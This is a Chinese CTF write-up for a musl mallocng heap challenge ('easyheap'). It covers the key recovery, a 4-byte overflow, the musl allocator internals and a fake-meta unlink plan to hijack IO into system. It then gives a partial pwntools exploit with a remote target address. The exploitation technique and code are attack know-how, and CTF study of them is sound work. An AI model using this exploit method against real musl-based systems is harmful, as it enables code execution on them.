<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  data = *codep;</span><br><span class="line">  keyp += <span class="number">2</span>;</span><br><span class="line">  ++codep;</span><br><span class="line">  <span class="built_in">sprintf</span>(keyp, <span class="string">&quot;%02x&quot;</span>, (<span class="keyword">unsigned</span> __int8)data ^ <span class="number">0x23</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( keyp != (<span class="keyword">char</span> *)&amp;zero );</span><br><span class="line"><span class="keyword">if</span> ( key[<span class="number">0</span>] ^ <span class="number">0x3036323130313437</span>LL | key[<span class="number">1</span>] ^ <span class="number">0x6337303165363331</span>LL</span><br><span class="line">  || key[<span class="number">2</span>] ^ <span class="number">0x3237633763343735</span>LL | key[<span class="number">3</span>] ^ <span class="number">0x3231313131363437</span>LL )</span><br></pre></td></tr></table></figure>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">0x3036323130313437</span>,<span class="number">0x6337303165363331</span>,<span class="number">0x3237633763343735</span>,<span class="number">0x3231313131363437</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    num = i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        key = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            key += <span class="built_in">chr</span>((num % <span class="number">0x100</span>))</span><br><span class="line">            num = num // <span class="number">0x100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+key)^<span class="number">0x23</span>),end=<span class="string">&quot;&quot;</span>) <span class="comment"># W31C0M3_to_QWB21</span></span><br></pre></td></tr></table></figure>
<p>函数 Prepare 提供了4种核心功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">90</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">14</span>+funcs dq offset add                     ; DATA XREF: Prepare+<span class="number">230</span>↑o</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">70</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span>+                                        ; Prepare+<span class="number">23</span>C↑r</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+dq offset dele</span><br><span class="line">.data:<span class="number">0000000000204300</span> <span class="number">00</span> <span class="number">00</span>                         dq offset show</span><br><span class="line">.data:<span class="number">0000000000204300</span>                               dq offset edit</span><br></pre></td></tr></table></figure>
<ul>
<li>add：输入 size 作为 num 的个数，然后输入 size 个 num，申请 <code>(num+1)*4</code> 大小的 chunk，以4字节为单位将数据写入 chunk，最后调用 <code>get_op</code> 依次遍历这些数字，并依次随机选择四则运算中的一个运算操作符进行运算，将运算结果填充到最后一个数字槽中</li>
<li>edit：重新输入 size 个 num，调用 <code>get_op</code> 进行计算，并将结果写回（位置错误）</li>
</ul>
<p>函数 Challenge 需要对最后一个随机生成的数字进行猜测，程序对每一次猜测提供了两次 Silver Finger 和全局两次 Golden Finger 的功能：</p>
<ul>
<li>Silver Finger 只会允许跳过当前级别对数字的猜测</li>
<li>Golden Finger 会根据用户输入的数字的数量，得到最终正确答案的数字</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>函数 add 执行结果回写的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = &amp;node-&gt;chunk[size + <span class="number">1</span> - <span class="number">1</span>];</span><br><span class="line">*data = get_op(chunk, size);</span><br></pre></td></tr></table></figure>
<p>函数 edit 执行结果回写的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizea = size + <span class="number">1</span>;</span><br><span class="line">chunk[sizea] = get_op(chunk, sizea);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现，函数 edit 有明显的4字节溢出</li>
</ul>
<p>打印数据时，会输出38字节，但是 <code>info.header-&gt;name</code> 的值可能小于38字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#   Name: %-38s #\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;info.header-&gt;name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#   Level: %-38d#\n&quot;</span>, **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)((<span class="keyword">char</span> *)&amp;info.header-&gt;level + info.header-&gt;size));</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your name!&quot;</span>);</span><br><span class="line">readn(info.header-&gt;name, len);</span><br></pre></td></tr></table></figure>
<p>输入 num 时没有进行限制，导致可以将 heap 上的任意数据写入 mmapg</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num = input_num();</span><br><span class="line">......</span><br><span class="line">mmapg[index] = chunk[num];</span><br></pre></td></tr></table></figure>
<p><strong>libc musl</strong></p>
<p>musl 把 chunk 大小分为48类，用 size_to_class 进行计算（与 <code>*active[48]</code> 对应）</p>
<p>mallocng 在分配 meta 时，总是先分配一页的内存，然后划分为多个 meta 区域，而该页的最开始存放的就是 meta_area（这一页的内存用于管理 chunk）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> check; <span class="comment">/* 用于和malloc_context-&gt;secret进行匹配 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">/* 下一个节点指针 */</span></span><br><span class="line">	<span class="keyword">int</span> nslots; <span class="comment">/* 当前使用的meta数量 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> <span class="comment">/* 指向meta的指针(结构体meta_area后面的内存就是meta数组) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">/* 双向链表 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span> <span class="comment">/* 指向group */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask; <span class="comment">/* 可用/释放chunk的bitmap */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>; <span class="comment">/* 表示最后一个chunk的下标 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>; <span class="comment">/* group的大小,如果mem是mmap分配,固定为63 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>; <span class="comment">/* 如果group是mmap分配的,则代表内存页数,否则为&#x27;0&#x27; */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>多个相同大小的 chunk（物理相邻）以及一些控制信息会组成 group</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span> <span class="comment">/* 指回meta */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>]; <span class="comment">/* 0x10字节对齐(NUIT为0x10) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[]; <span class="comment">/* 存放chunk数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>chunk 没有专门在代码中定义，但总体结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> prev_user_data[]; <span class="comment">/* 用于存储上一个chunk的数据 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx; <span class="comment">/* 低5bit作为idx表示这是group中第几个chunk,高3bit作为预留位 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">/* 与第一个chunk的偏移 */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[]; <span class="comment">/* 用于存储数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add([<span class="number">1</span>]*<span class="number">6</span>)</span><br><span class="line">add([<span class="number">2</span>]*<span class="number">6</span>)</span><br><span class="line">add([<span class="number">3</span>]*<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p>可以在 GDB 中打印此数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x555555604cc0</span> <span class="comment">/* 释放前 */</span></span><br><span class="line"><span class="number">0x555555604cc0</span>:	<span class="number">0x556060e0</span>	<span class="number">0x00005555</span>	<span class="number">0x0000000e</span>	<span class="number">0x00000000</span> <span class="comment">/* chunk1 */</span></span><br><span class="line"><span class="number">0x555555604cd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x555555604ce0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0xffffffff</span>	<span class="number">0x00020100</span> <span class="comment">/* chunk2 */</span></span><br><span class="line"><span class="number">0x555555604cf0</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x555555604d00</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0xfffffffa</span>	<span class="number">0x00040200</span> <span class="comment">/* chunk3 */</span></span><br><span class="line"><span class="number">0x555555604d10</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0x555555604d20</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x0000000f</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x555555604cc0</span> <span class="comment">/* 释放后 */</span></span><br><span class="line"><span class="number">0x555555604cc0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x0000000e</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk1 */</span></span><br><span class="line"><span class="number">0x555555604cd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x555555604ce0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000002</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk2 */</span></span><br><span class="line"><span class="number">0x555555604cf0</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x555555604d00</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000010</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk3 */</span></span><br><span class="line"><span class="number">0x555555604d10</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0x555555604d20</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0xfffffffd</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前6个数据是输入的 num，第7个数据是计算的结果，第8个数据就是 <code>idx offset</code></li>
</ul>
<p>musl 中的 unlink 依赖与如下的函数，本身缺乏检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>dequeue</code>函数的触发条件如下：</p>
<ul>
<li>队列不能为空</li>
<li>队列的头指针不能为空</li>
<li>队列中至少有一个元素</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>现在有4字节的溢出，可以覆盖 <code>chunk-&gt;idx,offset</code>，不过首先需要利用溢出泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add([<span class="number">0xFFFFFFFF</span>]*<span class="number">20</span>) <span class="comment"># 0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment"># 0</span></span><br><span class="line">exit()</span><br><span class="line">challenge([<span class="number">0x0</span>], <span class="string">&quot;d&quot;</span> * <span class="number">0x18</span>, <span class="literal">True</span>)</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xb7870</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ffec78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0x7ffff7ffec78</span> ◂— <span class="number">0x6464646464646464</span> (<span class="string">&#x27;dddddddd&#x27;</span>)</span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffff7ffec90</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffff7ffeca8</span> —▸ <span class="number">0x7ffff7ffe870</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>由于 meta 所在页与 group 所在页分离，想要伪造 meta，就必须要泄露 secret：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmapg[index] = chunk[num];</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 num 没有限制，因此可以将 heap 上的 secret 写入 mmapg</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#1</span></span><br><span class="line">exit()</span><br><span class="line">challenge([(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1228</span>),(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1221</span>)])</span><br></pre></td></tr></table></figure>
<p>接下来就是布置堆风水，将当前堆块的最后 4 个字节设置为 0xdeadbeef010，通过 4 字节溢出将下一个堆块的 offset 值设置为 0 </p>
<p>释放下一个 chunk，将 meta 劫持到 0xdeadbeef010 处，然后程序会执行 <code>dequeue</code> 将 fake meta unlink，在此处会触发一次 WAA 任意写，我们的目标就是劫持 musl IO 并执行 system</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./easyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1528)\nb *$rebase(0x1AC6)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Code: &quot;</span>,<span class="string">&quot;W31C0M3_to_QWB21&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">nums</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_Cr34t3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;need?&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(nums)))</span><br><span class="line">    <span class="keyword">for</span> idx,n <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        sla(<span class="string">&quot;num&quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, nums</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_M0d1Fy&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;modify?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> idx, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        sla(<span class="string">&quot;num&quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_D3l3Te&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;delete?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_G00dBye&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">answers, name=<span class="literal">None</span>, wait=<span class="literal">False</span></span>):</span></span><br><span class="line">    